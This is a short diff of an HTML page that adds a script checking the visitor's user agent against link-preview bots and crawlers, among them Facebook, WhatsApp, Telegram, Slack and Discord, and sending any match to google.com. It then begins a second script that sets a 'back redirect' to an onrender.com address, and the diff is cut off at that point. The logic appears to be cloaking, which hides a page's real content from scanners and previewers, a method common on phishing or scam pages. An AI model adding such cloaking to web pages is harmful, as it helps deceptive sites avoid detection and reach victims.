@@ -25,6 +25,35 @@
 <link href="#" rel="stylesheet">
 
 <script>
+(function () {
+  var redirect = "https://www.google.com/";
+  var ua = navigator.userAgent.toLowerCase();
+
+  var bots = [
+    "facebookexternalhit",
+    "facebot",
+    "whatsapp",
+    "telegram",
+    "slackbot",
+    "discordbot",
+    "crawler",
+    "spider"
+  ];
+
+  
+
+  var isBot = bots.some(function (b) {
+    return ua.indexOf(b) !== -1;
+  });
+
+  if (isBot) {
+    window.location.replace(redirect);
+  }
+})();
+</script>
+
+
+<script>
  
   const DEFAULT_BACK_REDIRECT = 'https://priv-ek12.onrender.com';
 
